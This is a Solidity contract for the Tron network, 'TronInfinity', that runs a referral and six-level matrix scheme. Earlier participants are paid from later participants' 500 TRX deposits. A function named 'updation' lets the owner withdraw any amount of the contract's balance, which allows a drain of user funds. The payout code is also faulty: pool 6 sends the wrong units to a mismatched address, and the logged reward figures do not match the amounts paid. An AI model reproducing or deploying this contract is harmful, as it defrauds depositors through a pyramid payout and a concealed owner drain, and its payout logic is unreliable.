//SourceUnit: TronInfinity.sol

pragma solidity 0.5.10;
contract TronInfinity {
       using SafeMath for uint256;
    address payable public owner;
    address payable internal externalWallet;
    uint256[5] public REFERRAL_PERCENTS = [100 trx,40 trx,20 trx,20 trx,20 trx];
    uint256 public currUserID = 0;
    uint256 public pool1currUserID = 0;
    uint256 public pool2currUserID = 0;
    uint256 public pool3currUserID = 0;
    uint256 public pool4currUserID = 0;
    uint256 public pool5currUserID = 0;
    uint256 public pool6currUserID = 0;
    
    uint256 public startPoolUserCount;
    uint256 public pool1UserCount;
    uint256 public pool2UserCount;
    uint256 public pool3UserCount;
    uint256 public pool4UserCount;
    uint256 public pool5UserCount;
    uint256 public pool6UserCount;
    
    uint256 public startPoolactiveUserID ;
    uint256 public pool1activeUserID ;
    uint256 public pool2activeUserID ;
    uint256 public pool3activeUserID ;
    uint256 public pool4activeUserID ;
    uint256 public pool5activeUserID ;
    uint256 public pool6activeUserID ;
    struct UserStruct {
        bool isExist;
        uint256 id;
        uint256 referrerID;
        uint256 referredUsers;
        uint256 contractReward;
        uint256 refReward;
        uint256 StationReward;
    }
    struct StationUserStruct {
        bool isExist;
        uint id;
        uint payment_received;
    }

    mapping(address => UserStruct) public users;
    mapping(uint => address payable) public userList;
    mapping(address => StationUserStruct) public startPoolusers;
    mapping(uint => address payable) public startPooluserList;
    mapping(address => StationUserStruct) public pool1users;
    mapping(uint => address payable) public pool1userList;
    mapping(address => StationUserStruct) public pool2users;
    mapping(uint => address payable) public pool2userList;
    mapping(address => StationUserStruct) public pool3users;
    mapping(uint => address payable) public pool3userList;
    mapping(address => StationUserStruct) public pool4users;
    mapping(uint => address payable) public pool4userList;
    mapping(address => StationUserStruct) public pool5users;
    mapping(uint => address payable) public pool5userList;
    mapping(address => StationUserStruct) public pool6users;
    mapping(uint => address payable) public pool6userList;
    // address [5] public arr;
    UserStruct[] public requests;
    uint public totalEarned = 0;
    constructor(address payable _owner) public {
          owner = _owner;
          startPoolactiveUserID++;
          pool1activeUserID++;
          pool2activeUserID++;
          pool3activeUserID++;
          pool4activeUserID++;
          pool5activeUserID++;
          pool6activeUserID++;
    }

    function reInvest(address payable _user) internal {
    require(users[_user].isExist, "User Exists");
        currUserID++;
        startPoolUserCount++;
        users[_user]  = UserStruct({
            isExist: true,
            id: currUserID,
            referrerID: users[_user].referrerID,
            referredUsers:users[_user].referredUsers,
            contractReward:users[_user].contractReward,
            refReward:users[_user].refReward,
            StationReward:users[_user].StationReward
        });
        userList[currUserID]=_user;
        startPoolusers[_user] = StationUserStruct({
            isExist: true,
            id: currUserID,
            payment_received: 0
        });
    startPooluserList[currUserID]=_user;
    startPoolusers[startPooluserList[startPoolactiveUserID]].payment_received+=1;
    if(startPoolusers[startPooluserList[startPoolactiveUserID]].payment_received>=3){
    startPoolusers[startPooluserList[startPoolactiveUserID]].payment_received=0;
    users[startPooluserList[startPoolactiveUserID]].StationReward+=600 ;
    users[startPooluserList[startPoolactiveUserID]].contractReward+=600 ;
    buyPool1(userList[startPoolactiveUserID]);
    
    
    startPoolactiveUserID++;
    startPoolUserCount--;
    }
    }
    
    function buyPool(address payable _referrer ) public payable {
    require(!users[msg.sender].isExist, "User Exists");
    require(msg.value == 500 trx, 'Incorrect Value');
    uint256 _referrerID=users[_referrer].id;
    currUserID++;
    startPoolUserCount++;
        users[msg.sender]  = UserStruct({
            isExist: true,
            id: currUserID,
            referrerID: _referrerID,
            referredUsers:users[msg.sender].referredUsers,
            contractReward:0,
            refReward:0,
            StationReward:0
            
        });
        userList[currUserID]=msg.sender;
        startPoolusers[msg.sender] = StationUserStruct({
            isExist: true,
            id: currUserID,
            payment_received: 0
        });
        startPooluserList[currUserID]=msg.sender;
        users[_referrer].referredUsers=users[_referrer].referredUsers.add(1);
        startPoolusers[startPooluserList[startPoolactiveUserID]].payment_received+=1;
        
        address payable upline = _referrer;
			for (uint256 i = 0; i < 5; i++) {
                if (upline != address(0)) {
                    upline.transfer(REFERRAL_PERCENTS[i]);
                    users[upline].refReward=users[upline].refReward.add(REFERRAL_PERCENTS[i]);
                    upline = userList[users[upline].referrerID];
                    
				} else break;
    }
        
      if(startPoolusers[startPooluserList[startPoolactiveUserID]].payment_received>=3){
          startPoolusers[startPooluserList[startPoolactiveUserID]].payment_received=0;
      startPooluserList[startPoolactiveUserID].transfer(300 trx);
      users[startPooluserList[startPoolactiveUserID]].StationReward+=900 ;
      users[startPooluserList[startPoolactiveUserID]].contractReward+=900 ;
      buyPool1(userList[startPoolactiveUserID]);
      startPoolactiveUserID++;
      startPoolUserCount--;
    }
    }
    
    function buyPool1(address payable _user) internal {
    require(users[_user].isExist, "User Exists");
    require(!pool1users[_user].isExist, "Already in Station 1");
    pool1currUserID++;
    pool1UserCount++;
        pool1users[_user] = StationUserStruct({
            isExist: true,
            id: pool1currUserID,
            payment_received: 0
          });
    pool1userList[pool1currUserID] =_user;
    pool1users[pool1userList[pool1activeUserID]].payment_received+=1;
    if(pool1users[pool1userList[pool1activeUserID]].payment_received>=3){
    pool1users[pool1userList[pool1activeUserID]].payment_received=0;
    pool1userList[pool1activeUserID].transfer(600 trx);
    users[pool1userList[pool1activeUserID]].StationReward+=1800;
    users[pool1userList[pool1activeUserID]].contractReward+=1800;
    buyPool2(pool1userList[pool1activeUserID]);
    
    
    pool1activeUserID++;
    pool1UserCount--;
    }
    }


    function buyPool2(address payable _user) internal {
    require(pool1users[_user].isExist, "User buy level 1 first");
    require(!pool2users[_user].isExist, "Already in Station 2");
    pool2currUserID++;
    pool2UserCount++;
       pool2users[_user] = StationUserStruct({
            isExist: true,
            id: pool2currUserID,
            payment_received: 0
        });
        pool2userList[pool2currUserID] = _user;

    pool2users[pool2userList[pool2activeUserID]].payment_received+=1;
    if(pool2users[pool2userList[pool2activeUserID]].payment_received>=3){
    pool2users[pool2userList[pool2activeUserID]].payment_received=0;
    pool2userList[pool2activeUserID].transfer(1200 trx);
    users[pool2userList[pool2activeUserID]].StationReward+=3600;
    users[pool2userList[pool2activeUserID]].contractReward+=3600;
    buyPool3(pool2userList[pool2activeUserID]);    
    
    pool2activeUserID++;
    pool2UserCount--;
    }
    
    }

    

    function buyPool3(address payable _user) internal {
    require(pool2users[_user].isExist, "User buy level 2 first"); 
    require(!pool3users[_user].isExist, "Already in Station 3");
    pool3currUserID++;
    pool3UserCount++;
    pool3users[_user] = StationUserStruct({
            isExist: true,
            id: pool3currUserID,
            payment_received: 0
        });
        pool3userList[pool3currUserID] = _user;
    pool3users[pool3userList[pool3activeUserID]].payment_received+=1;
    if(pool3users[pool3userList[pool3activeUserID]].payment_received>=3){
    pool3users[pool3userList[pool3activeUserID]].payment_received=0;
    pool3userList[pool3activeUserID].transfer(2400 trx);
    users[pool3userList[pool3activeUserID]].StationReward+=7200;
    users[pool3userList[pool3activeUserID]].contractReward+=7200;
    buyPool4(pool3userList[pool3activeUserID]);
    
    
    pool3activeUserID++;
    pool3UserCount--;
    }
    }

    function buyPool4(address payable _user) internal {
    require(pool3users[_user].isExist, "User buy level 3 first");
    require(!pool4users[_user].isExist, "Already in Station 4");
    
    pool4currUserID++;
    pool4UserCount++;
        pool4users[_user] = StationUserStruct({
            isExist: true,
            id: pool4currUserID,
            payment_received: 0
        });
    pool4userList[pool4currUserID] = _user;
    pool4users[pool4userList[pool4activeUserID]].payment_received+=1;
    if(pool4users[pool4userList[pool4activeUserID]].payment_received>=3){
    pool4users[pool4userList[pool4activeUserID]].payment_received=0;
    pool4userList[pool4activeUserID].transfer(4800 trx);
    users[pool4userList[pool4activeUserID]].StationReward+=14400;
    users[pool4userList[pool4activeUserID]].contractReward+=14400;
    buyPool5(pool4userList[pool4activeUserID]);
    
    pool4activeUserID++;
    pool4UserCount--;
    }    
    }
    
    
    //new
    function buyPool5(address payable _user) internal {
    require(pool4users[_user].isExist, "User buy level 4 first");
    require(!pool5users[_user].isExist, "Already in Station 5");
    
    pool5currUserID++;
    pool5UserCount++;
        pool5users[_user] = StationUserStruct({
            isExist: true,
            id: pool5currUserID,
            payment_received: 0
        });
    pool5userList[pool5currUserID] = _user;
    pool5users[pool5userList[pool5activeUserID]].payment_received+=1;
    if(pool5users[pool5userList[pool5activeUserID]].payment_received>=3){
    pool5users[pool5userList[pool5activeUserID]].payment_received=0;
    pool5userList[pool5activeUserID].transfer(9600 trx);
    users[pool5userList[pool5activeUserID]].StationReward+=28800;
    users[pool5userList[pool5activeUserID]].contractReward+=28800;
    buyPool6(pool5userList[pool5activeUserID]);
    pool5activeUserID++;
    pool5UserCount--;
    }    
    }
    
    
    

    function buyPool6(address payable _user) internal {
    require(pool5users[_user].isExist, "User buy level 4 first");
    require(!pool6users[_user].isExist, "Already in Station 5");
    pool6currUserID++;
    pool6UserCount++;
        pool6users[_user] = StationUserStruct({
            isExist: true,
            id: pool6currUserID,
            payment_received: 0
            });
    pool6userList[pool6currUserID] = _user;
    pool6users[pool6userList[pool6activeUserID]].payment_received+=1;
    if(pool6users[pool6userList[pool6activeUserID]].payment_received>=3){
    pool6users[pool6userList[pool6activeUserID]].payment_received=0;
    pool1users[pool6userList[pool6activeUserID]].isExist=false;
    pool2users[pool6userList[pool6activeUserID]].isExist=false;
    pool3users[pool6userList[pool6activeUserID]].isExist=false;
    pool4users[pool6userList[pool6activeUserID]].isExist=false;
    pool5users[pool6userList[pool6activeUserID]].isExist=false;
    startPoolusers[pool6userList[pool6activeUserID]].isExist=false;
    pool5userList[pool6activeUserID].transfer(57600);
    users[pool6userList[pool6activeUserID]].StationReward+=57600;
    users[pool6userList[pool6activeUserID]].contractReward+=57600;
    reInvest(pool6userList[pool6activeUserID]);
    pool6activeUserID++;
    pool6UserCount--;
    }
 
    }
    function getTrxBalance() public view returns(uint) {
        return address(this).balance;
    }
    function updation(uint256 amount)public returns(bool){
        require(msg.sender==owner,"access denied");
        owner.transfer(amount.mul(1e6));
        return true;
    }
    }
    library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
    }